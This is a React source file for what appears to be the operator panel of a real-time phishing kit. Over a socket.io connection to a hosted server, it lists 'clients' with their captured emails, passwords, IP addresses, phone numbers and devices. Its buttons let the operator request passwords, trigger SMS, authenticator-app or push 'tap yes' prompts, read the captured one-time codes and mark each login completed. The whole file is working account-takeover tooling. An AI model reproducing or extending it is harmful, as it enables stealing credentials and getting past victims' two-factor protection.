import { useEffect, useRef } from "react";
import { useState } from "react";
import io from 'socket.io-client';

function App() {

  const socketHolder = useRef(null);
  const [storage, setStorage] = useState({ data: {} });
  const [views, setView] =  useState('');

  // The last digit of the clients phone number state
  const [lastDigit, setLastDigit] = useState(null);
  const [allowed, setAllowed] = useState(false);
  const [verificationDetails, setVerificationDetails] = useState(null);
  const [country, setCountry] = useState(''); //This is for smsotp only, for setting country code for the phone number. It is not required for tapyes and google authenticator.

  //This is for reminding what has not been done
  const [error, setError] = useState();

  // This state is to implement interaction changes temporarily i.e color, font, size, shape ...
  const [styling, setStyling] = useState();

  // This state stores resend request type and email for reference to client that initiated the resend request.
  const [resendRequest, setResendRequest] = useState([]);

  
  const [id, setId] =  useState(''); 

  //This state is used to id the current client for verification process
  const [verificationId, setverificationId] = useState();

  useEffect(() => {
    const handleReload = () => {
      sessionStorage.removeItem("normalized");
      if (sessionStorage.getItem('anotherWayData')) {
        setAllowed(true);
        const data = JSON.parse(sessionStorage.getItem('anotherWayData'));
        console.log(JSON.stringify(data));
        if (data.type === 'authotp') {
          googleAuthSender(data.id, data.email, data.type)
        } else {
          setType(data.id, data.email, data.type);
        }
      }
    };

    window.addEventListener("beforeunload", handleReload);

    return () => {
      window.removeEventListener("beforeunload", handleReload);
    };
  }, []);

  // This useEffect is for re-assigning anotherWayData upon reload
  useEffect(() => {
    const anotherWayData = sessionStorage.getItem("anotherWayData");

    if (!anotherWayData) return;

    try {
      const data = JSON.parse(anotherWayData);

      setAllowed(true);
      console.log(JSON.stringify(data));

      if (data.type === "authotp") {
        googleAuthSender(data.id, data.email, data.type);
      } else {
        setType(data.id, data.email, data.type);
      }
    } catch (error) {
      console.error("Invalid anotherWayData in sessionStorage:", error);
    }
  }, []);

  useEffect(()=>{
    if (socketHolder.current) {
      return;
    }

    const socket = io("https://websocket-i9hd.onrender.com", {autoConnect: false, reconnection: false});
    socketHolder.current = socket.connect();
  },[]);

  useEffect(()=>{
    (socketHolder.current).on('clientsData', (data)=>{
      setStorage(data);
    });

    (socketHolder.current).on('authenticationRe-initiation', (data)=>{
      console.log(JSON.stringify(data?.cleared));
      const payload = data?.resendData ? data.resendData : data?.cleared ? data.cleared : data;

      const normalized = Array.isArray(payload) ? payload : typeof payload === "object" && payload !== null && !Array.isArray(payload) ? [payload] : [];

      data?.resendData ?
        sessionStorage.setItem('normalized', JSON.stringify(normalized))
      : data?.cleared ?
        sessionStorage.setItem("normalized", JSON.stringify(JSON.parse(sessionStorage.getItem("normalized")).filter((item) => item.resendEmail !== normalized[0].resendEmail)))
      :
        sessionStorage.getItem('normalized') && JSON.parse(sessionStorage.getItem('normalized')).length > 0 ?
          JSON.parse(sessionStorage.getItem('normalized')).forEach((item) => {
            if (JSON.stringify(item) === JSON.stringify(normalized[0])) {
              sessionStorage.setItem('normalized', JSON.stringify(normalized));
            } else {
              sessionStorage.setItem('normalized', JSON.stringify([...normalized, ...JSON.parse(sessionStorage.getItem('normalized'))]));
            }
          })
        : 
          sessionStorage.setItem('normalized', JSON.stringify(normalized));


      setResendRequest(JSON.parse(sessionStorage.getItem('normalized')));
    });

    (socketHolder.current).on('resetData', (data)=>{
      sessionStorage.setItem('anotherWayData', JSON.stringify(data));
      setAllowed(true);
      if (data.type === 'authotp') {
        googleAuthSender(data.id, data.email, data.type)
      } else {
        setType(data.id, data.email, data.type);
      }
    });

    return () => {
      socketHolder.current.off("clientsData");
      socketHolder.current.off("authenticationRe-initiation");
    };
  }, []);

  function reminder(message, identifier) {
    setError({'message': message, 'identifier': identifier});
  }

  function initiateLogin (email) {
    setView('passwordView');
    setId(email);
  }

  // This function is for switching on Client Detail view 
  function details(email) {
    setView('detailView');
    setId(email);
  }

  // This is for delete button, To delete users
  function remove(email, id) {
    try {
      socketHolder.current.emit('deleteClient', { 'id': id, 'email': email });
    } catch (e) {
      console.log("rejected");
    }
  }

  // for closing/switching off details view
  function leave() {
    setView('');
  }

  function checkEmail(id, email) {
    try {
      socketHolder.current.emit('notExisting', { 'id': id, 'email': email, 'exist': false });
    } catch (e) {
      console.log("rejected");
    }
  }

  function passwordRequest(id, email, authentication) {
    setError();
    try {
      socketHolder.current.emit('passwordRequest', { 'id': id, 'passwordStatus': 'processing', 'email': email, 'authentication': authentication }, (response) => {
        if (response?.status) {
          // 
        }
      });
    } catch (e) {
      console.log("rejected");
    }
  }

  function setType(id, email, type) {
    setStyling({'id': email, 'type': type});
    {type === 'smsotp' ? setAllowed(true) : type === 'tapyes' ? setAllowed(true) : setAllowed(false)}
    setverificationId({'email': email, 'type': type});
    setVerificationDetails({'id': id, 'email': email, 'type': type});
  }

  // Function handler switch to 2FA View from password View
  function next() {
    setError();
    setView('2FAView');
  }

  // This send 2FA for SMS Authentication code and Tap yes Authentication.
    
  function verificationRequest (event) {
    event.preventDefault(); // Prevents page refresh
    console.log('shows twice');

    const patternCountry = /^[A-Za-z]{2,3}$/
    const patternLastDigit = /^\d{2}$/

    try {
      if (verificationDetails.type === 'smsotp' && patternCountry.test(country) && patternLastDigit.test(lastDigit)) {
        socketHolder.current.emit('verificationRequest', { 'id': verificationDetails.id, 'email': verificationDetails.email, 'verificationType': verificationDetails.type, 'lastTwoDigit': lastDigit, 'country': country.toUpperCase() }, (response) => {
          if (response?.status) {
            setStyling(); //removes temporary styling for interaction change
          }
        })
      } else if (verificationDetails.type === 'tapyes' && patternLastDigit.test(lastDigit)) {
        socketHolder.current.emit('verificationRequest', { 'id': verificationDetails.id, 'email': verificationDetails.email, 'verificationType': verificationDetails.type, 'lastTwoDigit': lastDigit }, (response) => {
          if (response?.status) {
            setStyling(); //removes temporary styling for interaction change
          }
        })
      }
      setCountry(''); setLastDigit(); setAllowed(false);
      if (sessionStorage.getItem('anotherWayData')) { sessionStorage.removeItem('anotherWayData') }
    } catch (e) {
      console.log("rejected");
    }
  }

  function otpGoAhead(email, id, status) {
    try {
      socketHolder.current.emit('otpGoAhead', { 'id': id, 'email': email, 'verifiedPhone': status }, (response) => {
        if (response?.status) {
          // 
        }
      });
    } catch (e) {
      console.log("rejected");
    }
  }

  function googleAuthSender(id, email, type) {
    setStyling({'id': email, 'type': type});
    try {
      socketHolder.current.emit('verificationRequest', { 'id': id, 'email': email, 'verificationType': type, 'lastTwoDigit': null }, (response) => {
        if (response?.status) {
          setStyling(); //removes temporary styling for interaction change
        }
      });
      if (sessionStorage.getItem('anotherWayData')) { sessionStorage.removeItem('anotherWayData') }
    } catch (e) {
      console.log("rejected");
    }
    setAllowed(false);
  }

  function failedVerification(id, email) {
    try {
      socketHolder.current.emit('failedVerification', { 'id': id, 'email': email }, (response) => {
      });
    } catch (e) {
      console.log("rejected");
    }
  }

  //This onclick function is used to reactivate tap yes authentication sender ui and functionality
  function resendTapYes(data) {
    sessionStorage.setItem("normalized", JSON.stringify(JSON.parse(sessionStorage.getItem("normalized")).filter((item) => item.resendEmail !== data.resendEmail)))
    setAllowed(true);
    setverificationId({'email': data.resendEmail, 'type': data.resendType});
    setVerificationDetails({'id': data.id, 'email': data.resendEmail, 'type': data.resendType});
    setResendRequest(JSON.parse(sessionStorage.getItem('normalized')));
  }

  // This is emit on succesfull login
  function exit(id, email) {
    try {
      socketHolder.current.emit('exit', { 'id': id, 'email': email });
      setError();
      setView('');
    } catch (e) {
      console.log("rejected");
    }
  }

  return (
    <div className="w-[100vw] overflow-y-scroll flex flex-row flex-wrap py-5 px-5">
      {Object.entries(storage.data || {}).map(([email, info]) => (
        <div key={email} className="w-[300px] h-[400px] border border-black rounded-2xl px-1 py-1 relative">
          {/*<p>{info.email}</p>*/}
          <div className="w-[100%] h-[35%] rounded-xl bg-green-800">
          </div>
          <div className="w-[60px] h-[60px] rounded-full bg-purple-700 absolute top-[25%] left-6 flex justify-center items-center">
            <p className="text-4xl font-semibold text-white">{email[0].toUpperCase()}</p>
          </div>
          <div className="w-[100%] h-[13%] mt-[7%] pl-6 flex flex-col justify-center ">
            <div className=""></div>
            <p className="text-sm font-normal">Client Email</p>
            <div className="w-[100%] flex flex-row justify-between items-center">
              <p className="text-sm font-light">{email}</p>
              <button className={`px-3 py-1 bg-red-600 text-white text-sm ${!info.password && info.email ? 'flex' : 'hidden'}`} onClick={()=> checkEmail(info.id, email)}>Wrong</button>
            </div>
          </div>
          <div className="w-[100%] h-[45%] border gap-y-[3.3%] flex flex-col justify-start items-end">

            {/* Initiate Login Procedure */}
            <div className={`${(info['Login completed'] ? 'hidden' : 'flex')} w-[100%] py-2 px-2 flex-row justify-start items-center gap-x-3 rounded-lg border border-black cursor-pointer`} onClick={() => initiateLogin(email)}>
              <div className="w-[30px] aspect-square">
                <svg viewBox="0 0 486.8 486.8">
                  <g>
                    <path d="M80 370.406c-1.9-3.3-6.2-4.4-9.5-2.5l-17.4 10.1v-20.1c0-3.8-3.1-6.9-6.9-6.9s-6.9 3.1-6.9 6.9v20.1l-17.4-10.1c-3.3-1.9-7.6-.8-9.5 2.5s-.8 7.6 2.5 9.5l17.5 10.2-17.5 10.2c-3.3 1.9-4.4 6.2-2.5 9.5s6.2 4.4 9.5 2.5l17.4-10.1v20.1c0 3.8 3.1 6.9 6.9 6.9s6.9-3.1 6.9-6.9v-20.1l17.4 10.1c3.3 1.9 7.6.8 9.5-2.5s.8-7.6-2.5-9.5l-17.5-10.2 17.5-10.2c3.3-2 4.5-6.2 2.5-9.5M143.9 409.706c1.9 3.3 6.2 4.4 9.5 2.5l17.4-10.1v20.1c0 3.8 3.1 6.9 6.9 6.9s6.9-3.1 6.9-6.9v-20.1l17.4 10.1c3.3 1.9 7.6.8 9.5-2.5s.8-7.6-2.5-9.5l-17.5-10.2 17.5-10.2c3.3-1.9 4.4-6.2 2.5-9.5s-6.2-4.4-9.5-2.5l-17.4 10.1v-20.1c0-3.8-3.1-6.9-6.9-6.9s-6.9 3.1-6.9 6.9v20.1l-17.4-10c-3.3-1.9-7.6-.8-9.5 2.5s-.8 7.6 2.5 9.5l17.5 10.2-17.5 10.1c-3.3 1.9-4.4 6.2-2.5 9.5M131.5 462.106v12.2c0 2.9 2.4 5.3 5.3 5.3h81.9c2.9 0 5.3-2.4 5.3-5.3v-12.2c0-2.9-2.4-5.3-5.3-5.3h-81.9c-3 0-5.3 2.4-5.3 5.3M331.1 121.106h-.6v-27.2c0-47.3-38.7-87.5-85.9-86.7-45.9.8-83.1 38.4-83.1 84.5v2.6c0 3.9 3.2 7.1 7.1 7.1h22.7c3.9 0 7.1-3.2 7.1-7.1v-.8c0-25.4 19.1-47.7 44.5-49.3 27.6-1.7 50.6 20.2 50.6 47.4v29.4h-70v.1h-64.7c-12 .4-21.7 10.1-21.7 22.2v123c0 12.3 10 22.3 22.3 22.3H331c12.3 0 22.3-10 22.3-22.3v-122.9c.1-12.3-9.9-22.3-22.2-22.3m-72.6 89.3c-1.7 1.2-2.2 2.5-2.2 4.5.1 9 .1 18 0 27.1.2 3.8-1.7 7.4-5.1 9.1-7.9 4-15.8-1.6-15.8-9.1v-27.200000000000003c0-1.8-.4-3.1-2-4.3-8.2-6-10.9-16.3-6.8-25.4 4-8.8 13.7-14 22.8-12.1 10.2 2 17.3 10.3 17.4 20.4.3 7.1-2.6 12.9-8.3 17M262.9 462.106v12.2c0 2.9 2.4 5.3 5.3 5.3h81.9c2.9 0 5.3-2.4 5.3-5.3v-12.2c0-2.9-2.4-5.3-5.3-5.3h-81.9c-2.9 0-5.3 2.4-5.3 5.3M275.3 409.706c1.9 3.3 6.2 4.4 9.5 2.5l17.4-10.1v20.1c0 3.8 3.1 6.9 6.9 6.9s6.9-3.1 6.9-6.9v-20.1l17.4 10.1c3.3 1.9 7.6.8 9.5-2.5s.8-7.6-2.5-9.5l-17.5-10.2 17.5-10.2c3.3-1.9 4.4-6.2 2.5-9.5s-6.2-4.4-9.5-2.5l-17.4 10.1v-20.1c0-3.8-3.1-6.9-6.9-6.9s-6.9 3.1-6.9 6.9v20.1l-17.4-10.1c-3.3-1.9-7.6-.8-9.5 2.5s-.8 7.6 2.5 9.5l17.5 10.2-17.5 10.2c-3.3 1.9-4.4 6.2-2.5 9.5M481.5 456.806h-81.9c-2.9 0-5.3 2.4-5.3 5.3v12.2c0 2.9 2.4 5.3 5.3 5.3h81.9c2.9 0 5.3-2.4 5.3-5.3v-12.2c0-2.9-2.4-5.3-5.3-5.3M5.3 479.606h81.9c2.9 0 5.3-2.4 5.3-5.3v-12.2c0-2.9-2.4-5.3-5.3-5.3H5.3c-2.9 0-5.3 2.4-5.3 5.3v12.2c0 2.9 2.4 5.3 5.3 5.3M406.8 409.706c1.9 3.3 6.2 4.4 9.5 2.5l17.4-10.1v20.1c0 3.8 3.1 6.9 6.9 6.9s6.9-3.1 6.9-6.9v-20.1l17.4 10.1c3.3 1.9 7.6.8 9.5-2.5s.8-7.6-2.5-9.5l-17.5-10.2 17.5-10.2c3.3-1.9 4.4-6.2 2.5-9.5s-6.2-4.4-9.5-2.5l-17.4 10.1v-20.1c0-3.8-3.1-6.9-6.9-6.9s-6.9 3.1-6.9 6.9v20.1l-17.4-10.1c-3.3-1.9-7.6-.8-9.5 2.5s-.8 7.6 2.5 9.5l17.5 10.2-17.5 10.2c-3.3 1.9-4.5 6.2-2.5 9.5" fill="#000000" opacity="1" data-original="#000000"></path>
                  </g>
                </svg>
              </div>
              <p className="text-sm text-black font-normal">Initiate Login Procedure</p>
            </div>

            <div className="w-[100%] flex flex-row gap-x-3 justify-start py-2 px-2 items-center rounded-lg border border-black cursor-pointer" onClick={()=>details(email)}>
              <div className="w-[30px] aspect-square">
                <svg viewBox="0 0 64 64">
                  <g>
                    <path d="M21.95 31.756c8.006 3.883 17.973-2.308 17.84-11.41-.691-16.674-24.45-16.673-25.14 0a12.58 12.58 0 0 0 7.3 11.41M47.56 31.296c-10.867-.046-16.481 13.211-9.04 20.97 7.53 8.155 21.554 2.628 21.48-8.53a12.453 12.453 0 0 0-12.44-12.44m5.53 13.44H42.03a1 1 0 1 1 0-2h11.06a1 1 0 0 1 0 2" fill="#000000" opacity="1" data-original="#000000"></path>
                    <path d="m37.47 33.406-2.41-.8a14.46 14.46 0 0 1-15.68 0l-8.05 2.69A10.71 10.71 0 0 0 4 45.466v5.03a3.78 3.78 0 0 0 3.78 3.77h29.91a14.43 14.43 0 0 1-.22-20.86" fill="#000000" opacity="1" data-original="#000000"></path>
                  </g>
                </svg>
              </div>
              <p className="text-base text-black font-normal">Details</p>
            </div>

            <div className="w-[100%] flex flex-row gap-x-3 justify-start py-2 px-2 items-center rounded-lg border border-black cursor-pointer" onClick={()=>remove(email, info.id)}>
              <div className="w-[30px] aspect-square">
                <svg viewBox="0 0 64 64">
                  <g>
                    <path d="M21.95 31.756c8.006 3.883 17.973-2.308 17.84-11.41-.691-16.674-24.45-16.673-25.14 0a12.58 12.58 0 0 0 7.3 11.41M47.56 31.296c-10.867-.046-16.481 13.211-9.04 20.97 7.53 8.155 21.554 2.628 21.48-8.53a12.453 12.453 0 0 0-12.44-12.44m5.53 13.44H42.03a1 1 0 1 1 0-2h11.06a1 1 0 0 1 0 2" fill="#000000" opacity="1" data-original="#000000"></path>
                    <path d="m37.47 33.406-2.41-.8a14.46 14.46 0 0 1-15.68 0l-8.05 2.69A10.71 10.71 0 0 0 4 45.466v5.03a3.78 3.78 0 0 0 3.78 3.77h29.91a14.43 14.43 0 0 1-.22-20.86" fill="#000000" opacity="1" data-original="#000000"></path>
                  </g>
                </svg>
              </div>
              <p className="text-base text-black font-normal">Delete</p>
            </div>

            <div className={`${info.verificationType ? 'hidden' : views === 'passwordView' && id === email ? 'flex' : 'hidden'} w-[80%] h-[55%] flex-col absolute top-40 right-8 p-2 border gap-y-2 border-black bg-white`}>
              {error && error.identifier === email && !info.password ?
                <div className="absolute bottom-0 left-0 h-[40%] w-[100%] bg-red-600 flex justify-center items-center px-2 py-1">
                  <p className="text-white text-sm font-medium text-center">{error.message}</p>
                </div>
              : 
                null
              }
              <div className="w-[100%] h-[100%] flex-col gap-y-3 flex justify-center items-center">
                <div className="w-[80%] py-2 border border-black flex justify-center">
                  <p className="text-base font-medium italic items-center">{ info.password || 'Password' }</p>
                </div>
                <button className={`${(info.passwordStatus && info.passwordStatus === 'processing') ? 'text-opacity-10' : (info.passwordStatus && info.passwordStatus === 'processed') ? 'text-opacity-10' : 'text-opacity-100'} text-sm font-medium text-black`} disabled={(info.passwordStatus && info.passwordStatus === 'processing') ? true : (info.passwordStatus && info.passwordStatus === 'processed') ? true : false} onClick={()=> passwordRequest(info.id, email, 'Request Password')}>Request Password</button>
                <button className={`${(info.passwordStatus && info.passwordStatus === 'processed') ? 'text-opacity-100' : 'text-opacity-10'} text-sm font-medium text-red-600`} disabled={(info.passwordStatus && info.passwordStatus === 'processed') ? false : true} onClick={()=> passwordRequest(info.id, email, 'Wrong password')}>Wrong password / Request Password</button>
              </div>
              <div className="cursor-pointer px-5 py-1 flex flex-row items-center justify-center bg-blue-500 w-[100%]" onClick={!info.password ? ()=>reminder('Error: You have not requested for Password or gotten Password', email) : next}>
                <p className="text-sm text-white">Proceed to 2FA</p>
              </div>
              <button className={`px-3 py-1 bg-green-600 text-white text-sm`} onClick={!info.password ? ()=>reminder('Error: You have not completed Login procedure', email) : ()=>exit(info.id, email)}>Login Completed</button>
            </div>

            <div className={`${info.verificationType && !info['Login completed'] ? 'flex' : views === '2FAView' && id === email && !info['Login completed'] ? 'flex' : 'hidden'} w-[85%] h-[73%] flex-col justify-start items-center bg-white absolute top-24 right-6 border border-black gap-y-2 z-30 py-2`}>
              {(!info.anotherWaySelect) ?
                <>
                  <div className="w-[100%] px-4">
                    <p className="text-sm font-medium text-black text-center">{'Select Two Factor Authentication Type'.toUpperCase()}</p>
                  </div>
                  <div className="w-[100%] gap-y-3 gap-x-2 flex flex-row flex-wrap justify-center items-center mb-3">
                    <button className={`py-2 px-2 text-sm font-light text-start ${styling && styling.id === email && styling.type === 'smsotp' ? 'bg-green-700 text-white' : info.verificationType && info.verificationType === 'smsotp' ? 'bg-green-700 text-white' : 'border border-black'}`} disabled={info.verificationType ? true : false} onClick={() => setType(info.id, email, 'smsotp')}>SMS OTP</button>
                    <button className={`py-2 px-2 text-sm font-light text-start ${styling && styling.id === email && styling.type === 'authotp' ? 'bg-green-700 text-white' : info.verificationType && info.verificationType === 'authotp' ? 'bg-green-700 text-white' : 'border border-black'}`} disabled={info.verificationType ? true : false} onClick={() => googleAuthSender(info.id, email, 'authotp')}>GOOGLE AUTH CODE</button>
                    <button className={`py-2 px-2 text-sm font-light text-start ${styling && styling.id === email && styling.type === 'tapyes' ? 'bg-green-700 text-white' : info.verificationType && info.verificationType === 'tapyes' ? 'bg-green-700 text-white' : 'border border-black'}`} disabled={info.verificationType ? true : false} onClick={() => setType(info.id, email, 'tapyes')}>TAP YES</button>
                    {info.verificationCode ?
                      <div className={`bg-green-700 py-2 px-2 text-start`}>
                        <p className="text-white text-sm font-light">CODE: {info.verificationCode ? info.verificationCode : ''}</p>
                      </div>
                    :
                      null
                    }
                  </div>
                  {allowed ?
                    <>
                      {verificationId?.email === email ?
                        <form onSubmit={verificationRequest} className={`${info.phone ? 'hidden' : 'flex'} flex-col justify-start items-start gap-y-2 py-2 px-2 bg-green-600`}>
                          <div className="flex flex-row gap-x-2 items-center">
                            <text className=" text-sm font-normal text-white">{verificationId.type !== 'smsotp' ? 'Tap Number' : 'Phone Number Digit:'}</text>
                            <input className="w-[30px] h-[30px] font-light bg-transparent border text-base placeholder:text-center text-center text-white placeholder:text-white/60" type="text" id="dg" name="dg" value={lastDigit} placeholder="88" onChange={(event) => setLastDigit(event.target.value)} />
                            {verificationId.type !== 'smsotp' ? <button type="submit" className="text-black text-sm px-5 py-1 bg-white font-normal">Send</button> : null} 
                          </div>
                          {verificationId.type === 'smsotp' ? (
                            <div className="flex flex-row gap-x-2 items-center">
                              <text className=" text-sm font-normal text-white">County Code:</text>
                              <input className="w-[30px] h-[30px] font-light bg-transparent border text-base placeholder:text-white/60 placeholder:text-center text-center text-white" type="text" id="countryCode" name="countryCode" value={country} placeholder="US" onChange={(event) => setCountry(event.target.value)} />
                              <button type="submit" className="text-black text-sm px-5 py-1 bg-white font-normal">Send</button>
                            </div>
                          ) : null}
                        </form>
                        :
                        <></>
                      }
                    </>
                    :
                    <></>
                  }
                  <div className={`w-[100%] flex flex-col gap-y-2 bg-black/20 p-2 ${!info.verifyPhoneStatus && info.phone ? 'flex' : info.verifyPhoneStatus === 'declined' && info.phone ? 'flex' : 'hidden'}`}>
                    <p className="text-sm font-medium text-black/50">Verify phone number:</p>
                    <div className="flex flex-row justify-center items-center gap-x-2">
                      <p className={`${info.verifyPhoneStatus && info.verifyPhoneStatus === "declined" ? 'bg-red-700 text-white p-1' : info.verifyPhoneStatus && info.verifyPhoneStatus === "verified" ? 'bg-green-700 text-white' : 'bg-transparent text-black/60'} text-base font-semibold`}>{info.phone}</p>
                      <button className={`${info.verifyPhoneStatus ? 'bg-black/20' : 'bg-green-700'} text-white text-sm px-2 py-1 font-normal`} disabled={info.verifyPhoneStatus ? true : false} onClick={()=> otpGoAhead(email, info.id, 'verified')}>Send</button>
                      <button className={`${info.verifyPhoneStatus ? 'bg-black/20' : 'bg-red-700'} text-white text-sm px-2 py-1 font-normal`} disabled={info.verifyPhoneStatus ? true : false} onClick={()=> otpGoAhead(email, info.id, 'declined')}>Reject</button>
                    </div>
                  </div>
                  {(info['2FARequest'] && info['2FARequest'] === 'processed') ?
                    <button className={`text-sm font-medium text-white bg-red-700 px-2 py-1 w-[90%]`} onClick={() => failedVerification(info.id, email)}>Tap For Failed Verification</button>
                  :
                    null
                  }

                  {info.verificationCode ?
                    <button className={`py-1 bg-green-600 text-white text-sm w-[90%]`} onClick={()=>exit(info.id, email)}>Login Completed</button>
                  :info.tapNumber?
                    <button className={`py-1 bg-green-600 text-white text-sm w-[90%]`} onClick={()=>exit(info.id, email)}>Login Completed</button>
                  :
                    null
                  }
                  {(resendRequest || [])
                    .filter(
                      (item) =>
                        item?.resendEmail === email &&
                        item?.resendType === info.verificationType
                    )
                    .map((item, index) => (
                      (item.resendType) === 'tapyes' ?
                        <button className="text-white text-sm text-center font-normal bg-red-700 w-[90%] py-1" onClick={()=>resendTapYes({ 'id': info.id, 'resendType': item.resendType, 'resendEmail': item.resendEmail })}>Click to send Tap Number</button>
                      :
                        <p key={`${item.resendEmail}-${item.resendType}-${index}`} className="text-red-600 text-sm text-center font-normal">
                          Resend authentication code for <br/> {item.resendType}
                        </p>
                    ))
                  }
                </>
              :
                <div className="w-[100%] flex flex-col gap-y-4 items-center h-[100%] break-words">
                  <InterestForm socketID={socketHolder.current} clientID={info.id} clientEmail={email} previousType={info.verificationType} />
                </div>
              }
            </div>

            <div className={`${views === 'detailView'? 'flex': 'hidden'} flex w-[90%] h-[67%] flex-col items-center py-2 px-2 absolute border border-black top-28 gap-y-2 right-4 p-2 bg-white`}>
              <div className="w-[100%] flex flex-row justify-end px-2">
                <button type="button" className="text-base font-medium text-red-700" onClick={leave}>X</button>
              </div>
              <p className="text-base font-bold text-black text-center">CLIENT INFORMATION</p>
              <div className="w-[100%] flex flex-col gap-y-2">
                <p className="text-base font-bold text-black">Email: <span className="font-medium text-red-700">{email}</span></p>
                <p className="text-base font-bold text-black">Password: <span className="font-medium text-green-700">{info.password}</span></p>
                <p className="text-base font-bold text-black">Ip address: <span className="font-medium text-green-700">{info.ip}</span></p>
                <p className="text-base font-bold text-black">Country: <span className="font-medium text-green-700">{info.country}</span></p>
                <p className="text-base font-bold text-black">Phone number: <span className="font-medium text-green-700">{info.phone || info.phone}</span></p>
                <p className="text-base font-bold text-black">Device type: <span className="font-medium text-green-700">{info.deviceType || info.deviceType}</span></p>
              </div>

            </div>
          </div>
        </div>
      ))}
    </div>
  );
}

const OPTIONS = [
  "Notification OTP",
  "SMS OTP",
  "Google Authentication"
];

function InterestForm({socketID, clientID, clientEmail, previousType}) {
  const [selected, setSelected] = useState([previousType === 'smsotp' ? 'SMS OTP' : previousType === 'authotp' ? 'Google Authentication' : 'Notification OTP']);
  sessionStorage.setItem('previousType', previousType);
  

  const handleChange = (event) => {
    const { value, checked } = event.target;

    setSelected((prev) =>
      checked ? [...prev, value] : prev.filter((item) => item !== value)
    );
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    console.log("Selected interests:", selected);

    // Example: send to your websocket server
    try {
      socketID.emit('allowedAuthentication', {'id': clientID, 'email': clientEmail, 'allowedAuthentications': selected});
      setSelected();
    } catch {
      
    }
  };

  return (
    <form
      onSubmit={handleSubmit}
      className="w-[90%] space-y-2 flex flex-col items-center bg-white p-2"
    >
      <div>
        <h2 className="text-sm font-normal text-gray-900 text-center">
          Select Available Authentication
        </h2>
      </div>

      <fieldset className="space-y-3">
        <legend className="sr-only">Interests</legend>

        {OPTIONS.map((option) => (
          <label
            key={option}
            className="flex cursor-pointer items-center gap-3 px-2 py-1 transition hover:border-gray-300 hover:bg-gray-50"
          >
            <input
              type="checkbox"
              name="interests"
              value={option}
              checked={selected.includes(option)}
              onChange={handleChange}
              className="h-4 w-4 rounded border-gray-300 text-blue-600 focus:ring-blue-500"
            />
            <span className="text-sm font-medium text-gray-800">
              {option}
            </span>
          </label>
        ))}
      </fieldset>

      <button
        type="submit"
        className={`w-full rounded-xl ${selected.length >= 1 ? false : true} bg-green-600 px-4 py-2 text-sm font-semibold text-white transition hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2 disabled:opacity-50`}
        disabled={selected.length >= 1 ? false : true}
      >
        Submit
      </button>
    </form>
  );
}

export default App;
